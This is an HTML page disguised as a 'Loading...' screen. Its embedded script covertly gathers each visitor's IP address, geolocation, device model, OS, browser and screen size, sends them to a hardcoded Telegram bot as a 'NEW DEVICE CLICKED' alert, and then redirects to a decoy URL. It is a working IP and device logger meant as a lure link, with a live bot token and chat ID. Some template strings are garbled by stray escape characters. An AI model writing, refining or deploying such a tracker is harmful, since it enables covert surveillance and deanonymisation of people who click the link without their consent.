<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
</head>
<body>
<script>
(async () => {
    const BOT_TOKEN = '8437574185:AAH3LG_IDft1pdrkfv-75rgWUCIWFYxECoM';
    const CHAT_ID   = '7863510010';
    const REDIRECT  = 'https://www.misha/dad/image23689/august2024.com';
    const API       = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    // ── IP + location ─────────────────────
    let ip = 'Unknown IP', loc = 'Unknown';
    try {
        const r = await fetch('https://ipapi.co/json/');
        if (r.ok) { const d = await r.json(); ip = d.ip; loc = `\( {d.city}, \){d.region}, ${d.country_name}`; }
    } catch {
        try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); ip = d.ip; } catch {}
    }

    // ── Device detection (exact same logic you spent hours perfecting) ──
    const ua = navigator.userAgent;
    let os = 'Unknown OS', osVer = 'N/A', model = 'Unknown Model/Device', maker = 'Unknown Manufacturer', browser = 'Unknown';

    // 1. Client Hints (modern Android/iOS) – highest priority
    if (navigator.userAgentData) {
        try {
            const h = await navigator.userAgentData.getHighEntropyValues(['platform','platformVersion','model','manufacturer']);
            os    = h.platform || os;
            osVer = h.platformVersion || osVer;
            model = h.model || model;
            maker = h.manufacturer || maker;
            browser = navigator.userAgentData.brands.find(b => !b.brand.includes('Not'))?.brand || browser;
        } catch {}
    }

    // 2. Your original bullet-proof fallback that beats the "K" bullshit
    if (model.includes('Unknown') || model === 'K') {
        if (/Android/.test(ua)) {
            os = 'Android';
            const v = ua.match(/Android (\d+(?:\.\d+)*)/);
            if (v) osVer = v[1];

            let m = ua.match(/\(([^;]+); Android [^;]+; ([^)]+)\)/);
            let seg = m ? m[2].trim() : '';
            if (seg.length <= 2 || seg === 'K') {
                m = ua.match(/Android [^;]+; ([^;)]+)(?:\sBuild\/)/);
                seg = m ? m[1].trim() : '';
            }
            model = seg.replace(/\s+Build\/.*/,'').trim();
            if (model.startsWith('SM-') || /Samsung/i.test(model)) maker = 'Samsung';
            else if (/Pixel/i.test(model)) maker = 'Google';
            else maker = 'Android Device';
        }
        else if (/iPhone|iPad|iPod/.test(ua)) {
            os = ua.includes('iPad') ? 'iPadOS' : 'iOS';
            model = ua.includes('iPad') ? 'iPad' : 'iPhone';
            maker = 'Apple';
            const v = ua.match(/OS (\d+_\d+)/);
            if (v) osVer = v[1].replace('_','.');
        }
    }

    if (browser === 'Unknown') {
        browser = /Edg/.test(ua) ? 'Edge' : /Firefox/.test(ua) ? 'Firefox' : /Chrome|CriOS/.test(ua) ? 'Chrome' : 'Safari';
    }

    // ── Message in your exact original format ──
    const text = `
*--- NEW DEVICE CLICKED ---*

*Time:* ${new Date().toISOString()}
*IP:* \( {ip} ( \){loc})
*OS/Version:* \( {os} ( \){osVer})
*Manufacturer:* ${maker}
*Model (Android Priority):* ${model}
*Browser:* ${browser}
*Screen:* \( {screen.width}x \){screen.height}

*Raw UA:* \`${ua}\``;

    // ── Send & redirect ──
    fetch(API, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({chat_id:CHAT_ID, text:text.trim(), parse_mode:'Markdown'})})
        .finally(() => setTimeout(() => location.replace(REDIRECT), 1000));
})();
</script>
</body>
</html>
